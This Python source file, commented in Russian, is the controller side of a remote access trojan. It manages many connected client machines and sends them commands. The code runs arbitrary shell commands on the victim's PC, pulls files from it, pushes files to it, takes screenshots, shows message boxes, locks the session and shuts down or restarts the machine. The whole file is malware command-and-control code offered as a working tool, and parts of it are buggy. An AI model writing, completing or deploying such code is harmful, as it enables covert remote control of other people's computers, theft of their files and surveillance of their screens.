import socket, json, base64

# Список команд с описанием, в виде 2д массива
commands = [
    ["exit", "Exits the connection on both sides"],
    ["cd", "Changes the active directory"],
    ["download", "Downloads files from the client"],
    ["upload", "Uploads files from the server to the client"],
    ["message", "Shows a message box on the client users screen"],
    ["lock", "Puts the client user back to the login screen"],
    ["shutdown", "Shutsdown the client users PC, will close connection"],
    ["restart", "Restarts the client users PC"],
    ["ratHelp", "Displays this list"],
    ["screen", "makes screenshot"],
]

# выводит список доступных команд
def helpCommand():
    """Выводит список доступных команд с описанием"""
    total = 0
    result = "\nCommands: \n"
    # Добавление описания каждой команды
    for x in commands:
        result = result + "\n" + f"[{total}] {commands[total][0]} - {commands[total][1]}"
        total += 1
    result = result + "\n" + "[∞] Anything - will run a command on the users PC like command prompt\n"
    return result

class ManyServers:
    """Класс Сервера, который позволяет оперировать с множеством подключений к клиентам."""
    def __init__(self):
        # import config
        # server = Server(config.SERVER_IP, config.SERVER_PORT)
        # список тегов активных серверов
        self.__servers_count: list[int] = []
        self.__servers_ips = {}
    
    def __add_server_to_count(self):
        i = 0
        while True:
            if i not in self.__servers_count:
                self.__servers_count.append(i)
                return i
            i += 1
    
    def add_connection(self):
        """Мониторинг новых подключений, если появляется запрос от нового клиента, принимает его"""
        import config
        # принятие запроса на подключение от клиента
        server = __Server(config.SERVER_IP, config.SERVER_PORT)
        # добавление нового подключения в список всех подключений
        self.__servers_ips.update({self.__add_server_to_count(): [server.tag, server]})
        # повторный вызов для бесконечного мониторинга
        self.add_connection()
    
    def view_all_servers(self):
        """Возвращает список активных подключений"""
        s = ""
        for i in self.__servers_ips.keys():
            print(self.__servers_count)
            s = s + str(i) + ". " + str(self.__servers_ips[i][0]) + "\n"
        return s
    
    async def make_command_to_server(self, command):
        """Создание запроса к клиенту или клиентам по тегу. Если тег = all, отправляет запрос всем клиентам"""
        # @todo many tags
        tag = command.split()[0]
        # обработка сценария с тегом all
        if tag == "all":
            for i in self.__servers_ips.values:
                i: __Server = i[1]
                # проверка занятости клиента другим запросом
                if i.in_process:
                    continue
                i.step()
        # проверка наличия подключения с полученным тегом
        elif self.__servers_ips.get(tag, "no") == "no":
            return f"exist not connection with name: {tag}"
        # проверка занятости клиента другим запросом
        elif self.__servers_ips[tag][1].in_process:
            return f"{tag} connection already in process"
        # выполнение запроса определенным клиентом
        else:
            command = command.split()[1:]
            res = self.__servers_ips[tag][1].step(command)
            return res


class __Server:
#public:
    def __init__(self, ip, port):
        self.in_process = False
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((ip, port))
        server.listen(0)
        print("[+] Waiting for a connection")
        self.connection, address = server.accept()
        self.tag = address[0]
        print("[+] Connection received from " + str(address))
        # helpCommand()
        
    def step(self, command):
        # command = command.split(" ", 1)
        try:
            if command[0] == "upload":
                fileContent = self.__readFile(command[1]).decode()
                command.append(fileContent)
            result = self.__executeRemotely(command)
            if command[0] == "download" and "[-] Error" not in result:
                result = self.__writeFile(command[1], result)
            if command[0] == "screenshot" and "[-] Error" not in result:
                result = self.__screenshot(result)
            elif command[0] == "ratHelp":
                result = helpCommand()
        except Exception:
            result = "[-] Error running command, check the syntax of the command."
        return result

# private:    
    # def __dataReceive(self):
    #     jsonData = b""
    #     while True:
    #         try:
    #             jsonData += self.connection.recv(1024)
    #             return json.loads(jsonData)
    #         except ValueError:
    #             continue

    # def __dataSend(self, data):
    #     jsonData = json.dumps(data)
    #     self.connection.send(jsonData.encode())

    # выполнение команды в консоли клиента
    def __executeRemotely(self, command):
        """выполнение команды в консоли клиента"""
        self.__send_json(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.__receive_json()

    # чтение файла
    def __readFile(self, path):
        """чтение файла"""
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    # создание файла
    def __writeFile(self, path, content):
        """создание файла"""
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download complete"
    
    # делает скриншот на клиенте
    def __screenshot(self, content):
        """делает скриншот на клиенте"""
        with open("screen.png", "wb") as file:
            file.write(base64.b64decode(content))
        return ("[+] screen complete",)
    
    # Отправка json-данных клиенту
    def __send_json(self, data):
        """Отправка json-данных клиенту"""
        # Обрабатываем бинарные данные
        try: json_data = json.dumps(data.decode('utf-8'))
        except: json_data = json.dumps(data)
        
        # В случае если клиент разорвал соединение но сервер отправляет команду
        try:
            self.connection.send(json_data.encode('utf-8')) 
        except ConnectionResetError:
            # Отключаемся от текущей сессии
            self.connection = None


    # Получаем json данные от клиента
    def __receive_json(self):
        """Получение json данные от клиента"""
        json_data = ''
        while True:
            try:
                if self.connection != None:
                    json_data += self.connection.recv(1024).decode('utf-8')
                    return json.loads(json_data)
                else: 
                    return None
            except ValueError:
                pass
